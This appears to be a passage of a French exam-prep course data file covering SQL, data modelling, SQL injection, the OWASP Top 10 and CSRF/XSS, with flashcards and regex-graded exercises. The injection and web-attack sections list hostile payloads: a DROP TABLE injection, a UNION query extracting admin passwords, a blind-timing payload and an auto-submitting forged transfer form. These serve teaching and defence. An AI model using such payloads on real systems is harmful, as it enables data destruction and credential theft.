    <thead><tr><th>Option</th><th>Effet</th></tr></thead>
    <tbody>
      <tr><td><code>ON DELETE CASCADE</code></td><td>Supprime les enfants avec le parent (commande vers lignes de commande)</td></tr>
      <tr><td><code>ON DELETE SET NULL</code></td><td>Garde l'enfant et met la clé étrangère à NULL</td></tr>
      <tr><td><code>ON DELETE RESTRICT</code></td><td>Interdit la suppression du parent, comportement par défaut</td></tr>
    </tbody>
  </table>

  <h2>4. ALTER TABLE (très fréquent depuis 2024)</h2>
  <pre class="codeblock"><code class="lang-sql">ALTER TABLE contrat ADD COLUMN num_secu VARBINARY(255) NULL;
ALTER TABLE client  MODIFY COLUMN email VARCHAR(200) NOT NULL;
ALTER TABLE client  ADD CONSTRAINT uq_client_email UNIQUE (email);
ALTER TABLE contrat ADD CONSTRAINT fk_contrat_client
  FOREIGN KEY (id_client) REFERENCES client(id);
ALTER TABLE journal RENAME TO logs_connexion;</code></pre>

  <h2>5. Les jointures</h2>
  <pre class="codeblock"><code class="lang-sql">-- INNER JOIN : uniquement les lignes qui correspondent des deux cotes
SELECT c.nom, k.numero
FROM client c
INNER JOIN contrat k ON k.id_client = c.id;

-- LEFT JOIN : tous les clients, meme sans contrat
SELECT c.nom, k.numero
FROM client c
LEFT JOIN contrat k ON k.id_client = c.id;

-- Clients sans aucun contrat : LE pattern a connaitre
SELECT c.nom
FROM client c
LEFT JOIN contrat k ON k.id_client = c.id
WHERE k.id IS NULL;</code></pre>

  <h2>6. Agrégats, GROUP BY, HAVING</h2>
  <pre class="codeblock"><code class="lang-sql">SELECT id_client, COUNT(*) AS nb_contrats, SUM(montant) AS total
FROM contrat
WHERE date_signature >= '2026-01-01'
GROUP BY id_client
HAVING COUNT(*) > 2
ORDER BY total DESC;</code></pre>
  <ul>
    <li>Toute colonne du <code>SELECT</code> qui n'est pas dans un agrégat doit figurer dans le <code>GROUP BY</code>.</li>
    <li><code>WHERE</code> filtre <strong>avant</strong> le regroupement, <code>HAVING</code> filtre <strong>après</strong> et peut porter sur un agrégat.</li>
    <li><code>WHERE COUNT(*) &gt; 2</code> est illégal, c'est <code>HAVING</code>.</li>
  </ul>

  <h2>7. Ordre logique d'exécution</h2>
  <pre class="codeblock"><code class="lang-text">FROM -> JOIN -> WHERE -> GROUP BY -> HAVING -> SELECT -> ORDER BY -> LIMIT</code></pre>
  <p>C'est ce qui explique qu'un alias défini dans <code>SELECT</code> ne soit pas utilisable dans <code>WHERE</code>, mais le soit dans <code>ORDER BY</code>.</p>

  <h2>8. Mise à jour, suppression, transactions</h2>
  <pre class="codeblock"><code class="lang-sql">UPDATE client SET email = 'nouveau@exemple.fr' WHERE id = 42;
DELETE FROM journal WHERE horodatage < NOW() - INTERVAL 6 MONTH;

START TRANSACTION;
UPDATE compte SET solde = solde - 100 WHERE id = 1;
UPDATE compte SET solde = solde + 100 WHERE id = 2;
COMMIT;   -- ou ROLLBACK en cas d'erreur</code></pre>
  <p><strong>Sécurité :</strong> un <code>UPDATE</code> ou un <code>DELETE</code> sans <code>WHERE</code> modifie toute la table. Dans une question de sécurisation, c'est le risque à identifier.</p>
  <p><strong>ACID</strong> : Atomicité, Cohérence, Isolation, Durabilité. À citer dès qu'une question parle de virement, de commande ou d'opération multi-tables.</p>

  <h2>9. Sauvegarde</h2>
  <ul>
    <li><strong>Logique</strong> : <code>mysqldump</code> vers un fichier SQL (portable, lent sur gros volumes).</li>
    <li><strong>Physique</strong> : copie des fichiers ou snapshot (rapide, lié à la version).</li>
    <li><strong>Différentielle ou incrémentale</strong> : seulement les changements.</li>
    <li>Règle <strong>3-2-1</strong> : 3 copies, 2 supports différents, 1 hors site. Un backup non testé n'est pas un backup.</li>
  </ul>
  `,
  cards: [
    { id: "s1", q: "Différence entre clé primaire et clé étrangère", a: "La <strong>clé primaire</strong> identifie de façon unique une ligne de sa table, jamais NULL. La <strong>clé étrangère</strong> référence la clé primaire d'une autre table et assure l'intégrité référentielle." },
    { id: "s2", q: "Pourquoi DECIMAL et pas FLOAT pour un montant ?", a: "<code>FLOAT</code> stocke en binaire approximatif, donc les arrondis dérivent (<code>0.1 + 0.2 != 0.3</code>). <code>DECIMAL(10,2)</code> stocke exactement, c'est obligatoire pour de l'argent." },
    { id: "s3", q: "Comment lister les clients sans aucun contrat ?", a: "<code>SELECT c.nom FROM client c LEFT JOIN contrat k ON k.id_client = c.id WHERE k.id IS NULL;</code>" },
    { id: "s4", q: "Quelle différence entre WHERE et HAVING ?", a: "<code>WHERE</code> filtre les lignes <strong>avant</strong> le regroupement et ne peut pas porter sur un agrégat. <code>HAVING</code> filtre <strong>après</strong> <code>GROUP BY</code> et accepte <code>COUNT(*)</code>, <code>SUM()</code>, etc." },
    { id: "s5", q: "Récite l'ordre logique d'exécution d'une requête", a: "<code>FROM</code>, <code>JOIN</code>, <code>WHERE</code>, <code>GROUP BY</code>, <code>HAVING</code>, <code>SELECT</code>, <code>ORDER BY</code>, <code>LIMIT</code>." },
    { id: "s6", q: "Que fait ON DELETE CASCADE ?", a: "Supprime automatiquement les lignes enfants quand le parent est supprimé. Utile pour commande vers lignes de commande. <code>SET NULL</code> garde l'enfant, <code>RESTRICT</code> bloque la suppression." },
    { id: "s7", q: "Quelles sont les 4 propriétés ACID ?", a: "Atomicité (tout ou rien), Cohérence (contraintes respectées), Isolation (transactions indépendantes), Durabilité (persistance après validation)." },
    { id: "s8", q: "Le risque d'un DELETE sans WHERE ?", a: "Il vide la table entière. C'est à la fois un risque de perte de données et un scénario classique d'injection SQL destructrice." },
    { id: "s9", q: "Que signifie la règle 3-2-1 en sauvegarde ?", a: "3 copies des données, 2 supports différents, 1 copie hors site. Et un backup non testé n'est pas un backup." }
  ],
  ateliers: [
    {
      id: "at-sql-leftjoin",
      title: "Clients sans contrat",
      lang: "sql",
      prompt: `<p>Tables <code>client(id, nom, email)</code> et <code>contrat(id, numero, id_client, montant)</code>.</p>
      <p>Écris la requête qui affiche le nom des clients n'ayant <strong>aucun</strong> contrat.</p>`,
      starter: `SELECT `,
      model: `SELECT c.nom
FROM client c
LEFT JOIN contrat k ON k.id_client = c.id
WHERE k.id IS NULL;`,
      checks: [
        { label: "LEFT JOIN (pas INNER)", test: /LEFT\s+(OUTER\s+)?JOIN/i },
        { label: "Jointure sur id_client = c.id", test: /ON\s+k?\.?id_client\s*=\s*c?\.?id/i },
        { label: "Teste IS NULL sur la table de droite", test: /WHERE\s+k?\.?id\s+IS\s+NULL/i },
        { label: "Sélectionne le nom", test: /SELECT\s+[cC]?\.?nom/i }
      ]
    },
    {
      id: "at-sql-groupby",
      title: "Top clients par chiffre d'affaires",
      lang: "sql",
      prompt: `<p>Table <code>contrat(id, id_client, date_signature, montant)</code>.</p>
      <p>Affiche les clients ayant signé plus de 2 contrats depuis le 01/01/2026, avec le nombre de contrats et le montant total, triés du plus gros total au plus petit.</p>`,
      starter: `SELECT `,
      model: `SELECT id_client, COUNT(*) AS nb_contrats, SUM(montant) AS total
FROM contrat
WHERE date_signature >= '2026-01-01'
GROUP BY id_client
HAVING COUNT(*) > 2
ORDER BY total DESC;`,
      checks: [
        { label: "Agrégats COUNT et SUM", test: /COUNT\s*\([\s\S]*SUM\s*\(/i },
        { label: "Filtre de date dans WHERE", test: /WHERE[\s\S]*date_signature\s*>=\s*'2026-01-01'/i },
        { label: "GROUP BY sur id_client", test: /GROUP\s+BY\s+id_client/i },
        { label: "Seuil > 2 dans HAVING", test: /HAVING\s+COUNT\s*\(\s*\*\s*\)\s*>\s*2/i },
        { label: "Aucun agrégat dans WHERE", test: /^(?![\s\S]*WHERE[\s\S]{0,80}(COUNT|SUM)\s*\()/i },
        { label: "Tri décroissant sur le total", test: /ORDER\s+BY[\s\S]*total[\s\S]*DESC/i }
      ]
    },
    {
      id: "at-sql-alter",
      title: "Ajoute une colonne chiffrée et une contrainte",
      lang: "sql",
      prompt: `<p>La table <code>contrat(id, id_client, date_debut, montant)</code> doit stocker le numéro de sécurité sociale chiffré avec <code>AES_ENCRYPT</code>. Il faut aussi garantir qu'un client ne peut avoir qu'un seul contrat actif identifié par <code>reference</code>.</p>
      <p>Écris les deux <code>ALTER TABLE</code>.</p>`,
      starter: `ALTER TABLE contrat `,
      model: `-- Colonne binaire : AES_ENCRYPT renvoie des octets, pas du texte
ALTER TABLE contrat ADD COLUMN num_secu VARBINARY(255) NULL;

-- Unicite de la reference de contrat
ALTER TABLE contrat ADD CONSTRAINT uq_contrat_reference UNIQUE (reference);`,
      checks: [
        { label: "Deux instructions ALTER TABLE", test: /ALTER\s+TABLE[\s\S]*ALTER\s+TABLE/i },
        { label: "ADD COLUMN avec un type binaire", test: /ADD\s+COLUMN\s+num_secu\s+VARBINARY\s*\(/i },
        { label: "Colonne autorisant NULL (données existantes)", test: /num_secu\s+VARBINARY\s*\(\s*255\s*\)\s+NULL/i },
        { label: "Contrainte UNIQUE ajoutée", test: /ADD\s+CONSTRAINT[\s\S]*UNIQUE\s*\(/i }
      ]
    }
  ]
},

/* ============================== 07 ============================== */
{
  id: "07-mcd-mld",
  num: "07",
  title: "MCD vers MLD",
  tag: "5 à 10 points",
  hot: false,
  intro: "Peu de points, mais des erreurs coûteuses : le raisonnement se propage. Les règles de transformation s'appliquent mécaniquement.",
  cours: `
  <h2>1. Vocabulaire</h2>
  <ul>
    <li><strong>MCD</strong> (conceptuel) : entités, associations, cardinalités. Indépendant du SGBD.</li>
    <li><strong>MLD</strong> (logique) : tables, colonnes, clés. Toujours indépendant du SGBD.</li>
    <li><strong>MPD</strong> (physique) : types SQL réels, index, moteur.</li>
  </ul>

  <h2>2. Les règles de transformation</h2>
  <ol>
    <li><strong>Entité vers table.</strong> L'identifiant devient la clé primaire.</li>
    <li><strong>Association 1:N</strong> : clé étrangère <strong>du côté N</strong>.
      <br><em>Client (0,N) et Contrat (1,1)</em> : <code>contrat</code> reçoit <code>id_client</code>.</li>
    <li><strong>Association N:N</strong> : <strong>table de jointure</strong> avec les deux clés étrangères, formant une clé primaire composée.
      <br><em>Étudiant (0,N) et Module (0,N)</em> : table <code>inscription(id_etudiant, id_module)</code>.</li>
    <li><strong>Association porteuse d'attributs</strong> : si 1:N, les attributs migrent côté N. Si N:N, ils vont dans la table de jointure.</li>
    <li><strong>Association 1:1</strong> : clé étrangère d'un côté (le côté obligatoire), avec contrainte <code>UNIQUE</code>.</li>
    <li><strong>Héritage</strong> : une seule table avec discriminant, une table par classe fille, ou table mère plus tables filles.</li>
  </ol>

  <h2>3. Lire une cardinalité</h2>
  <p><code>Client (0,N) -- (1,1) Contrat</code> se lit : "un client peut avoir de 0 à N contrats, un contrat appartient à exactement 1 client".</p>
  <ul>
    <li>Le <strong>N</strong> est du côté "plusieurs", donc c'est l'autre table qui reçoit la clé étrangère.</li>
    <li>Notation Merise : <code>0,n</code> et <code>1,1</code>. Notation UML : <code>0..*</code> et <code>1..1</code>.</li>
  </ul>

  <h2>4. Les pièges</h2>
  <ul>
    <li>Mettre la clé étrangère du mauvais côté. C'est l'erreur la plus fréquente, 2 à 3 points.</li>
    <li>Oublier la clé primaire composée sur une table de jointure.</li>
    <li>Oublier la contrainte <code>UNIQUE</code> sur une relation 1:1.</li>
    <li>Mélanger MCD et MLD dans la même réponse, alors que le sujet précise lequel il demande.</li>
    <li>Ne pas indiquer les types quand le sujet demande un MPD.</li>
  </ul>

  <h2>5. Exemple complet express</h2>
  <p>MCD : <code>Client (0,N) -- (1,1) Contrat (1,1) -- (0,N) Site</code></p>
  <pre class="codeblock"><code class="lang-text">client(id, nom, email)
site(id, libelle, adresse)
contrat(id, date_debut, montant, #id_client, #id_site)</code></pre>
  <p>Le <code>#</code> note la clé étrangère. Aucune table de jointure ici, parce que les deux associations sont 1:N.</p>
  `,
  cards: [
    { id: "c1", q: "Où va la clé étrangère dans une association 1:N ?", a: "Toujours <strong>du côté N</strong>, c'est-à-dire dans la table qui porte la cardinalité maximale plusieurs. La table côté 1 reçoit la clé primaire, l'autre la référence." },
    { id: "c2", q: "Que devient une association N:N ?", a: "Une <strong>table de jointure</strong> contenant les deux clés étrangères, qui forment ensemble une clé primaire composée. Ses éventuels attributs viennent aussi dans cette table." },
    { id: "c3", q: "Que faut-il ne pas oublier sur une relation 1:1 ?", a: "La contrainte <code>UNIQUE</code> sur la clé étrangère, sinon rien n'empêche plusieurs lignes de référencer le même parent et la relation devient 1:N." },
    { id: "c4", q: "Différence entre MCD, MLD et MPD ?", a: "MCD : entités et associations avec cardinalités, indépendant du SGBD. MLD : tables, colonnes, clés, encore indépendant. MPD : types SQL réels, index, moteur." },
    { id: "c5", q: "Traduis « Client (0,N) -- (1,1) Contrat »", a: "<code>client(id, nom, ...)</code> et <code>contrat(id, ..., #id_client)</code>. La clé étrangère est dans <code>contrat</code>, côté N." }
  ],
  ateliers: [
    {
      id: "at-mld-complet",
      title: "MCD vers MLD sur un cas complet",
      lang: "text",
      prompt: `<p>MCD : <code>Client (0,N) -- (1,1) Contrat (1,1) -- (0,N) Site</code>, et <code>Contrat (0,N) -- (0,N) Option</code> avec l'attribut <code>date_souscription</code> sur l'association.</p>
      <p>Écris le MLD complet, en notant les clés étrangères avec <code>#</code> et en précisant la clé primaire composée.</p>`,
      starter: `client(`,
      model: `client(id, nom, email)
site(id, libelle, adresse)
contrat(id, reference, date_debut, montant, #id_client, #id_site)

-- Association N:N porteuse de l'attribut date_souscription
-- Cle primaire composee sur la table de jointure
contrat_option(#id_contrat, #id_option, date_souscription)

ou, selon la convention du sujet :

option(id, libelle)
contrat_option(#id_contrat, #id_option, date_souscription)

Points de vigilance :
- id_client va dans contrat (cote N), pas dans client.
- id_site va dans contrat (cote N), pas dans site.
- La table de jointure porte la PK composee et l'attribut de l'association.`,
      checks: []
    },
    {
      id: "at-mld-nn",
      title: "Traduis une association N:N",
      lang: "text",
      prompt: `<p><code>Etudiant (0,N) -- (0,N) Module</code>, avec <code>note</code> comme attribut de l'association.</p>
      <p>Écris les trois tables du MLD avec les types SQL (MPD léger).</p>`,
      starter: `etudiant(`,
      model: `etudiant(id INT AUTO_INCREMENT PRIMARY KEY, nom VARCHAR(80) NOT NULL, prenom VARCHAR(80) NOT NULL)
module(id INT AUTO_INCREMENT PRIMARY KEY, libelle VARCHAR(120) NOT NULL, coefficient TINYINT NOT NULL)

inscription(
  id_etudiant INT NOT NULL,
  id_module   INT NOT NULL,
  note        DECIMAL(4,2) NULL,
  PRIMARY KEY (id_etudiant, id_module),
  FOREIGN KEY (id_etudiant) REFERENCES etudiant(id),
  FOREIGN KEY (id_module)   REFERENCES module(id)
);

L'attribut note appartient a l'association, donc il vit dans la table de jointure.`,
      checks: []
    }
  ]
},

/* ============================== 08 ============================== */
{
  id: "08-injection",
  num: "08",
  title: "Injection SQL & OWASP",
  tag: "100 % des sujets 2024-2026",
  hot: true,
  intro: "Toujours formulé de la même façon : quelle requête est exécutée, qu'affiche le navigateur, comment corriger, quel nom OWASP.",
  cours: `
  <h2>1. Le mécanisme</h2>
  <pre class="codeblock"><code class="lang-php">$sql = "SELECT * FROM utilisateur WHERE login = '" . $_POST['login'] . "'";</code></pre>
  <p>L'utilisateur saisit <code>' OR '1'='1</code>. La requête devient :</p>
  <pre class="codeblock"><code class="lang-sql">SELECT * FROM utilisateur WHERE login = '' OR '1'='1'</code></pre>
  <p>La condition est toujours vraie, donc toute la table est renvoyée.</p>

  <h2>2. Les 5 questions systématiques</h2>
  <h3>a) Quelle requête est réellement exécutée ?</h3>
  <p>Tu recopies la requête <strong>avec le payload inséré</strong>, guillemets compris. C'est du recopiage, pas de l'interprétation.</p>

  <h3>b) Qu'affiche le navigateur ?</h3>
  <p>Ça dépend de ce que le code fait du résultat. C'est là qu'on perd le plus de points.</p>
  <ul>
    <li><code>while ($row = $result->fetch()) { echo $row['login']; }</code> affiche <strong>tous les logins</strong> de la table.</li>
    <li><code>if ($result->num_rows &gt; 0) { echo "Connecté"; }</code> affiche simplement <strong>"Connecté"</strong>.</li>
    <li>Aucun affichage : l'injection réussit mais reste invisible (<em>blind SQL</em>).</li>
  </ul>

  <h3>c) Comment corriger ?</h3>
  <p>Requête préparée PDO plus <code>bindValue</code>, code réécrit. Jamais <code>addslashes</code> ni <code>mysql_real_escape_string</code>.</p>

  <h3>d) Nom OWASP ?</h3>
  <p><strong>A03:2021 Injection</strong>.</p>

  <h3>e) Quelles données peuvent fuiter ?</h3>
  <p>Tout ce que le compte applicatif peut lire dans le SGBD. D'où le moindre privilège : un compte limité à une base limite l'impact.</p>

  <h2>3. Variantes de payload</h2>
  <table class="tbl">
    <caption>Reconnaître l'objectif derrière le payload</caption>
    <thead><tr><th>Payload</th><th>Objectif</th></tr></thead>
    <tbody>
      <tr><td><code>' OR '1'='1</code></td><td>Contourner l'authentification, condition toujours vraie</td></tr>
      <tr><td><code>admin' -- </code></td><td>Commenter la fin de la requête</td></tr>
      <tr><td><code>' UNION SELECT login, mdp FROM admin -- </code></td><td>Exfiltrer une autre table, même nombre de colonnes requis</td></tr>
      <tr><td><code>'; DROP TABLE client; -- </code></td><td>Destruction, si les requêtes multiples sont activées</td></tr>
      <tr><td><code>' AND SLEEP(5) -- </code></td><td>Injection aveugle temporelle</td></tr>
    </tbody>
  </table>

  <h2>4. OWASP Top 10 (2021)</h2>
  <table class="tbl">
    <caption>Version à retenir, avec un exemple concret</caption>
    <thead><tr><th>#</th><th>Nom</th><th>Exemple</th></tr></thead>
    <tbody>
      <tr><td>A01</td><td>Broken Access Control</td><td>IDOR, accéder à la facture d'un autre client</td></tr>
      <tr><td>A02</td><td>Cryptographic Failures</td><td>MD5, HTTP en clair, clé AES en dur</td></tr>
      <tr><td>A03</td><td>Injection</td><td>SQL, XSS, commande OS</td></tr>
      <tr><td>A04</td><td>Insecure Design</td><td>aucune limite de tentatives dès la conception</td></tr>
      <tr><td>A05</td><td>Security Misconfiguration</td><td>root sans mot de passe, erreurs PHP affichées en prod, .git accessible</td></tr>
      <tr><td>A06</td><td>Vulnerable and Outdated Components</td><td>bibliothèque obsolète, CMS non patché</td></tr>
      <tr><td>A07</td><td>Identification and Authentication Failures</td><td>politique de mot de passe faible, session jamais régénérée</td></tr>
      <tr><td>A08</td><td>Software and Data Integrity Failures</td><td>dépendance non vérifiée, désérialisation non sûre</td></tr>
      <tr><td>A09</td><td>Security Logging and Monitoring Failures</td><td>aucun log, aucune alerte</td></tr>
      <tr><td>A10</td><td>SSRF</td><td>le serveur va chercher une URL fournie par l'utilisateur</td></tr>
    </tbody>
  </table>
  <p><strong>Astuce mémoire :</strong> accès, crypto, injection, design, config, composants, auth, intégrité, logs, SSRF.</p>

  <h2>5. XSS, le cousin</h2>
  <ul>
    <li><strong>Reflété</strong> : le payload vient de l'URL et s'affiche tel quel. <code>recherche.php?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
    <li><strong>Stocké</strong> : le payload est enregistré en base et affiché à tous les visiteurs. Le plus grave.</li>
    <li><strong>DOM</strong> : manipulé côté JavaScript.</li>
  </ul>
  <p><strong>Défenses</strong> : échappement de sortie (<code>htmlspecialchars</code>), en-tête <code>Content-Security-Policy</code>, cookies <code>HttpOnly</code>.</p>
  <div class="callout callout--key">
    <span class="callout__label">Distinction</span>
    <p>Injection SQL attaque le <strong>SGBD</strong>. XSS attaque le <strong>navigateur d'un autre utilisateur</strong>.</p>
  </div>
  `,
  cards: [
    { id: "i1", q: "Payload dans <code>login = '$x'</code> : l'utilisateur saisit <code>' OR '1'='1</code>. Quelle requête est exécutée ?", a: "<code>SELECT * FROM utilisateur WHERE login = '' OR '1'='1'</code>. La condition est toujours vraie, donc toutes les lignes remontent." },
    { id: "i2", q: "Le code fait <code>if ($result-&gt;num_rows &gt; 0) echo 'Connecté';</code>. Qu'affiche le navigateur ?", a: "Simplement <strong>\"Connecté\"</strong>. L'injection a réussi, mais aucun contenu de la base n'est affiché. Répondre \"l'attaquant voit la base\" sans lire le code fait perdre le point." },
    { id: "i3", q: "Comment corriger une injection SQL ?", a: "Requête préparée PDO avec <code>prepare()</code> et <code>bindValue()</code>. Pas de <code>addslashes</code>, pas de <code>mysql_real_escape_string</code>, pas de concaténation." },
    { id: "i4", q: "Catégorie OWASP d'une injection SQL ?", a: "<strong>A03:2021 Injection</strong>, qui regroupe SQL, XSS et injection de commande OS." },
    { id: "i5", q: "À quoi sert <code>admin' -- </code> ?", a: "Le <code>--</code> commente la fin de la requête, donc la condition de mot de passe est ignorée : <code>WHERE login = 'admin' -- '</code>." },
    { id: "i6", q: "Quelle condition pour qu'un UNION SELECT fonctionne ?", a: "Le nombre de colonnes doit correspondre à celui de la requête d'origine, et les types doivent être compatibles. D'où les essais <code>ORDER BY 1, 2, 3...</code>" },
    { id: "i7", q: "XSS reflété, stocké, DOM : quelle différence ?", a: "Reflété : le payload vient de l'URL et s'affiche immédiatement. Stocké : il est enregistré en base et servi à tous les visiteurs. DOM : il est manipulé par le JavaScript côté client." },
    { id: "i8", q: "Injection SQL contre XSS : qui est attaqué ?", a: "Injection SQL : le <strong>SGBD</strong>, via l'application. XSS : le <strong>navigateur d'un autre utilisateur</strong>." },
    { id: "i9", q: "Cite 5 catégories OWASP 2021", a: "A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A05 Security Misconfiguration, A07 Identification and Authentication Failures, A09 Logging Failures." }
  ],
  ateliers: [
    {
      id: "at-sqli-requete",
      title: "Reconstitue la requête exécutée",
      lang: "sql",
      prompt: `<p>Code : <code>$sql = "SELECT id, login FROM utilisateur WHERE login = '" . $_POST['login'] . "' AND mdp = '" . $_POST['mdp'] . "'";</code></p>
      <p>Saisie : login = <code>admin' -- </code>, mdp = <code>peu importe</code>.</p>
      <p>Écris la requête réellement exécutée.</p>`,
      starter: `SELECT `,
      model: `SELECT id, login FROM utilisateur WHERE login = 'admin' -- ' AND mdp = 'peu importe'`,
      checks: [
        { label: "Part de la requête d'origine", test: /SELECT[\s\S]*FROM\s+utilisateur/i },
        { label: "Payload inséré avec ses guillemets", test: /login\s*=\s*'admin'\s*--/i },
        { label: "La fin est commentée (AND mdp présent après --)", test: /--[\s\S]*mdp/i }
      ]
    },
    {
      id: "at-sqli-login",
      title: "Réécris l'authentification",
      lang: "php",
      prompt: `<p>Code vulnérable :</p>
      <pre class="codeblock"><code class="lang-php">$login = $_POST['login'];
$mdp   = $_POST['mdp'];
$sql   = "SELECT id, mdp FROM utilisateur WHERE login = '" . $login . "'";
$res   = $pdo->query($sql);
$user  = $res->fetch();

if ($user && $user['mdp'] === $mdp) { echo "Connecte"; }</code></pre>
      <p>Corrige les <strong>deux</strong> problèmes : l'injection SQL et la comparaison du mot de passe. Réécris le bloc complet.</p>`,
      starter: `$login = $_POST['login'];
$mdp   = $_POST['mdp'];

`,
      model: `$login = $_POST['login'];
$mdp   = $_POST['mdp'];

// 1. Requete preparee : la structure est compilee avant les valeurs
$stmt = $pdo->prepare('SELECT id, mdp FROM utilisateur WHERE login = :login');
$stmt->bindValue(':login', $login, PDO::PARAM_STR);
$stmt->execute();
$user = $stmt->fetch();

// 2. Comparaison avec password_verify, jamais ===
if ($user && password_verify($mdp, $user['mdp'])) {

    session_regenerate_id(true);
    $_SESSION['id_utilisateur'] = $user['id'];
    echo 'Connecte';

} else {
    // Message generique : pas d'enumeration des comptes
    echo 'Identifiants incorrects';
}`,
      checks: [
        { label: "prepare() au lieu de query()", test: /\$pdo\s*->\s*prepare\s*\(/i },
        { label: "Aucune concaténation de variable dans le SQL", test: /^(?![\s\S]*WHERE[^;]*["']\s*\.\s*\$)/i },
        { label: "Valeur liée avec bindValue ou execute(array)", test: /bindValue\s*\(|execute\s*\(\s*\[/i },
        { label: "password_verify remplace la comparaison ===", test: /password_verify\s*\(/i },
        { label: "Régénère la session après authentification", test: /session_regenerate_id/i }
      ]
    },
    {
      id: "at-owasp-classification",
      title: "Classe quatre scénarios dans l'OWASP",
      lang: "text",
      prompt: `<p>Pour chaque scénario, donne la catégorie OWASP 2021 et une phrase de justification.</p>
      <ol>
        <li>Un utilisateur change <code>?id=42</code> en <code>?id=43</code> et voit la facture d'un autre client.</li>
        <li>Les mots de passe sont stockés en MD5, et le site est accessible en HTTP.</li>
        <li>Le fichier <code>.git/config</code> est téléchargeable depuis le navigateur.</li>
        <li>Aucun log de connexion n'est conservé, aucune alerte n'existe.</li>
      </ol>`,
      starter: `1. `,
      model: `1. A01 Broken Access Control (IDOR).
L'utilisateur est authentifie mais peut lire une ressource qui ne lui appartient pas :
aucun controle de propriete sur l'objet demande.

2. A02 Cryptographic Failures.
MD5 est une fonction de hachage rapide et cassee pour les mots de passe, et HTTP
laisse circuler les identifiants en clair sur le reseau.

3. A05 Security Misconfiguration.
Un fichier de configuration et de versionnement est accessible depuis le web,
ce qui expose l'historique du code et parfois des identifiants.

4. A09 Security Logging and Monitoring Failures.
Sans journalisation ni alerte, une intrusion passe inapercue et ne peut pas etre
prouvee apres coup.`,
      checks: []
    }
  ]
},

/* ============================== 09 ============================== */
{
  id: "08b-attaques-web",
  num: "09",
  title: "CSRF, XSS, clic, SSRF & fichiers",
  tag: "Le reste du programme sécurité",
  hot: true,
  intro: "Le sujet demande rarement de réciter un nom d'attaque. Il demande trois choses : qui est attaqué, ce que l'attaquant obtient, et quelle parade côté code. Ces cinq familles couvrent tout ce qui reste après l'injection SQL.",
  cours: `
  <h2>1. Le tableau de tri (à savoir refaire de tête)</h2>
  <pre class="codeblock"><code class="lang-text">Attaque        Qui est attaque      Ce que l'attaquant obtient
Injection SQL  le SGBD              donnees ou login contourne
XSS            navigateur victime   vol de session, actions
CSRF           serveur via victime  action avec ses droits
SSRF           le serveur           acces au reseau interne
Traversee/LFI  le serveur           lecture de fichiers
Clickjacking   le clic victime      action non voulue</code></pre>
  <p>La question "qui est attaqué ?" suffit à éliminer deux ou trois réponses fausses dans un QCM. Injection SQL et XSS se confondent tout le temps : la première attaque la base, la seconde le navigateur.</p>

  <h2>2. CSRF : Cross-Site Request Forgery</h2>
  <p><strong>Le mécanisme.</strong> Le navigateur joint <em>automatiquement</em> le cookie de session à toute requête envoyée vers le site, y compris quand la requête part d'une page d'un autre domaine. L'attaquant n'a donc pas besoin de lire la réponse : il lui suffit de <em>déclencher</em> une requête.</p>
  <pre class="codeblock"><code class="lang-html">&lt;!-- page piegee, hebergee ailleurs --&gt;
&lt;form action="https://banque.fr/virement" method="post" id="f"&gt;
  &lt;input type="hidden" name="iban" value="FR76...ATTAQUANT"&gt;
  &lt;input type="hidden" name="montant" value="2000"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById("f").submit();&lt;/script&gt;</code></pre>
  <p>La victime est connectée à sa banque dans le même navigateur. Le cookie part tout seul, le virement est exécuté avec <strong>ses</strong> droits. Aucun mot de passe n'a été volé.</p>

  <h3>Les trois parades, dans l'ordre attendu</h3>
  <ol>
    <li><strong>Jeton anti-CSRF</strong> (synchronizer token) : généré côté serveur avec <code>random_bytes()</code>, stocké en <code>$_SESSION</code>, inséré en champ caché dans chaque formulaire. À la soumission, on compare avec <code>hash_equals()</code> (comparaison à temps constant, donc pas de fuite par timing). Un site tiers ne peut pas lire le jeton.</li>
    <li><strong>Cookie <code>SameSite</code></strong> : <code>Lax</code> ou <code>Strict</code> empêche le cookie de partir sur une requête d'origine tierce. C'est une défense en profondeur, <em>jamais la réponse principale</em> : anciens navigateurs, sous-domaines, et <code>Lax</code> laisse passer les <code>GET</code> de navigation.</li>
    <li><strong>Aucune action qui modifie l'état en <code>GET</code></strong> : <code>/supprimer?id=42</code> appelé par une simple balise <code>img</code> est déjà la faille de conception. Un <code>GET</code> doit être idempotent et sans effet de bord.</li>
  </ol>
  <div class="callout callout--warn">
    <span class="callout__label">Piège classique</span>
    <p>"J'ai mis <code>SameSite=Strict</code>, donc je suis protégé" ne rapporte pas le point. La réponse attendue reste le <strong>jeton en session comparé côté serveur</strong>. <code>SameSite</code> est un bonus, pas la correction.</p>
  </div>
  <p>Ce que CSRF <strong>n'est pas</strong> : ce n'est pas un vol de mot de passe, ce n'est pas du XSS. L'attaquant ne lit rien, il fait agir. Et si le site accepte aussi les requêtes <code>GET</code> pour modifier des données, la faille est plus large encore.</p>

  <h2>3. XSS : Cross-Site Scripting</h2>
  <pre class="codeblock"><code class="lang-text">Refleche   le payload vient de l'URL, il est renvoye dans la page tout de suite
Stocke     le payload est enregistre en base, il est servi a TOUS les visiteurs
DOM        le payload n'est jamais cote serveur, il est manipule par le JS client</code></pre>
  <p><strong>Impact</strong> : lecture de <code>document.cookie</code> si le cookie n'est pas <code>HttpOnly</code> (donc vol de session), actions dans le navigateur de la victime, redirection, défiguration, keylogging du formulaire de login.</p>
  <p><strong>Parade</strong> : échapper <em>à l'affichage</em>, pas à l'entrée.</p>
  <pre class="codeblock"><code class="lang-php">echo htmlspecialchars($commentaire, ENT_QUOTES, 'UTF-8');</code></pre>
  <ul>
    <li><code>ENT_QUOTES</code> échappe aussi les apostrophes : indispensable dans un attribut <code>value='...'</code>.</li>
    <li><code>'UTF-8'</code> évite les contournements par encodage mal déclaré.</li>
    <li>Ne pas "nettoyer" à l'entrée avec un filtre maison : on garderait des données dégradées en base et on raterait un autre contexte de sortie (attribut, JSON, JavaScript).</li>
    <li>Défense en profondeur : en-tête <code>Content-Security-Policy</code>, et cookie <code>HttpOnly</code> pour rendre le vol de session inutile.</li>
  </ul>

  <h2>4. Session : fixation, vol, expiration</h2>
  <ul>
    <li><strong>Fixation</strong> : l'attaquant impose un identifiant de session connu avant le login. Parade : <code>session_regenerate_id(true)</code> juste après authentification.</li>
    <li><strong>Vol de cookie</strong> : XSS, ou traffic non chiffré. Parades : <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>, HTTPS obligatoire.</li>
